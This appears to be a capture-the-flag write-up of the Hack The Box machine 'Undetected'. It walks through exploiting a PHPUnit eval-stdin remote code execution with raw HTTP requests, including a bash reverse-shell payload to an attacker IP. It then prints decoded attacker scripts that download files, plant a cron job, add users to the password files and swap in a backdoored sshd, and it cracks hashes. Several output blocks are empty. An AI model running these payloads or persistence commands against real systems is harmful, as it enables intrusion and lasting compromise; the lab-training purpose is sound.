## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```shell
# Nmap 7.92 scan initiated Wed Jul 20 14:06:19 2022 as: nmap -sC -sV -oA /root/Documents/HTB/Boxes/Undetected/nmap/initial-tcp 10.10.11.146

```
As we can see we have only port 80 and 22 in status "open".
Without further doing let's dig into port 80.  
As we open the site we can find another virtualhost `store.djewelry.htb`.  
Nothing really interesting can be seen on the site, so let's start directory enumeration on both domains.
Without specifying host header we can see the following:  
```

```
With `store.djewelry.htb` we can discover:
```

```
As we can see there are some differences between the plain virtualhost and `store.djewelry.htb`. In particular, we can see the `/vendor` directory which is odd.  
If we open the directory, we can see that directory listing is enabled.  
![](Attachments/Pasted%20image%2020220722150905.png)
As we can see there is a phpunit directory.  
php unit is [vulnerable to an RCE attack](https://www.exploit-db.com/exploits/50702) Without downloading the code we can see how the exploit works and try to exploit manually.

## Foothold
Once we have a good understanding of the exploit we can try to exploit the vulnerability manually.  
Basically what the exploit is doing is appending a php payload to the body of the HTTP request.  
We can try to achieve RCE with a basic payload and then move into a reverse shell payload.  
Let's start with sending the following request:  
```http
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 28

<?php system("whoami"); ?>
```
As a response we receive the following:  
```http
HTTP/1.1 200 OK
Date: Wed, 20 Jul 2022 12:21:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 9
Connection: close
Content-Type: text/html; charset=UTF-8

www-data
```
So we assessed that we can have remote execution.  
Now we can try for a reverse shell payload:  
```http
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1
Host: store.djewelry.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Content-Length: 71

<?php system('bash -c "bash -i >&/dev/tcp/10.10.14.2/9001 0>&1"'); ?>
```
The site hung and we get a reverse shell as `www-data`:  
```shell
root@kali:~/Documents/HTB/Boxes/Undetected# nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.146] 58408

bash: no job control in this shell
www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ 
```

## User
Once we have a foothold into the box we can search for files owned by www-data:  
```shell
www-data@production:/var/www/store/vendor$ find / -user www-data 2>/dev/null | grep -v '/proc\|/run\|/sys\|/var/www'
/dev/pts/0
/var/cache/apache2/mod_cache_disk
/var/backups/info
```
As we can see we have `/var/backups/info` which is an odd file.  
As we can notice this is a binary file; we can run strings against this file and see what it contains.  
```shell

As we can see there is a very long string that looks like to be hex encoded.  
Once we decode the string we can see the following:
```shell
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```
As we can see we have an hash value into this code snippet
```shell
[root@kali Undetected ]$ cat hash.txt

```
let's change the bad chars and try to crack it.

As we can see we successfully cracked the hash.  
Now we can use the `--show` flag to see the cracked hash value:  
```shell
[root@kali Undetected ]$ hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt  --show

```
Now we can extract the system users and try this credentials against ssh to see if we can get access:  
```shell
[root@kali Undetected ]$ crackmapexec ssh $TARGET -u system_users.txt -p 'ihatehackers'                   
SSH         10.10.11.146    22     10.10.11.146     [*] SSH-2.0-OpenSSH_8.2

As we can see credentials works for user `steven1`:  
```shell
[root@kali Undetected ]$ ssh $TARGET -l steven1               
The authenticity of host '10.10.11.146 (10.10.11.146)' can't be established.

```

## Root
Since it seems like we are reversing the path of another hacker and doing some forensics, once we log in, as user `steven` we can search for files owned by him:  
```shell
steven@production:~$ find / -user steven 2>/dev/null | grep -v '/proc\|/sys\|/run'
/dev/pts/1
/var/mail/steven
/home/steven
/home/steven/.cache
/home/steven/.cache/motd.legal-displayed

/home/steven/.local
/home/steven/.local/share
/home/steven/.local/share/nano
/home/steven/.ssh
/home/steven/.bash_logout
/home/steven/.bash_history
```
Now, we can check the contents of `/var/mail/steven` and see what we get:  
```

Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```
As stated in the email, some changes has been made to `apache2` due to a unspecified system failure.  
Now let's go to the apache configuration directory and see recently modified files:  
```shell
steven@production:/etc/apache2$ find . -type f -printf "%T+ %p \n" | grep -v 2020-04
2021-07-05+19:12:41.7502881810 ./mods-available/mpm_prefork.conf 
2020-10-06+15:47:56.0000000000 ./mods-available/php7.4.conf 
2021-05-17+07:10:04.0000000000 ./mods-available/reader.load 
2021-07-05+21:49:03.0000000000 ./mods-available/mod_reader.o 
2020-10-06+15:47:56.0000000000 ./mods-available/php7.4.load 
2022-01-27+15:25:57.5559635100 ./sites-available/001-store.conf 
2021-07-06+09:55:52.8319042220 ./sites-available/000-main.conf 
2021-06-17+18:27:53.0000000000 ./apache2.conf 
```
As we can see everything looks pretty standard except `./mods-available/mod_reader.o ` if we download and analyse the file with strings, we can see the following:  
```shell
[root@kali apache2-mods-available ]$ strings mod_reader.o
AUATUSH
<=tlH
[]A\A]
D$(1
D$(dH+
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/

/bin/bash
mod_reader.c

42PA
w#%
!uri
[... SNIP ...]
```
As we can see there is a string that looks base64-ish if we decode the string we can see the following content:  
```shell
[root@kali apache2-mods-available ]$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk42PA" | base64 -d
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshdc#   
```
This is a hint to move our investigation to `/usr/sbin/sshd`.  
Same binary could have been found, without looking at the email contet by investigating on timestamps:  
```shell
steven@production:/etc/apache2$ find / -type f -printf "%T+ %p 
" 2>/dev/null | grep -v " /run\| /proc\|.pyc\|.py\| /usr/share\| /usr/src/linux\|/lib/\| /var/www\| /sys" | grep "00:00:00"
2020-04-13+00:00:00.0000000000 /usr/sbin/sshd 
```
As we can see the binary is quite strange, since the size differs a lot.
Original:
```shell
[root@kali Undetected ]$ ls -lh /usr/sbin/sshd
-rwxr-xr-x 1 root root 1.2M May 14 20:55 /usr/sbin/sshd
```
The one available on the box:  
```shell
steven@production:/etc/apache2$ ls -lh /usr/sbin/sshd
-rwxr-xr-x 1 root root 3.5M Apr 13  2020 /usr/sbin/sshd
```
The last one is almost double the size of the original, so we can download `/usr/sbin/sshd` and examine it using ghidra (since we cannot use string because the file is too big).  
Once we disassemble the binary with ghidra, we can see the aut_password function containing suspicious `backdoor` variables.  
Basically here the hacker is hard coding the password into sshd using hex bytes and a XOR.

once we have the bytes we can use [cyberchef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x96'%7D,'Standard',false)&input=MHhmMGU3YWJkNgoweGE0YjNhM2YzCjB4ZjdiYmZkYzgKMHhmZGIzZDZlNwoweGZkYTBiM2Q2CjB4YjJkNmY0YTAKMHhiY2YwYjVlMwoweGE1YTlmNA) to decode the bytes.  
As a small adjustment we need to swap the endianess (since the decoded string does not make sense with the standard endianess) and XOR everything with `0x96` as the code is doing.  ![](Attachments/Pasted%20image%2020220722161535.png)
As additional adjustment, we can notice that the last value `backdoor[30]` is not copied as it is (`-0x5b`) but we need to take the value moved into the string `byte ptr [RSP + backdoor[30]],0xa5` so `0xa5` and move it to the head of the last bytes (due to the endianess).  
Once we have all the adjustments in place, we will have the root password decoded `@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3` and we will be able to login as root.
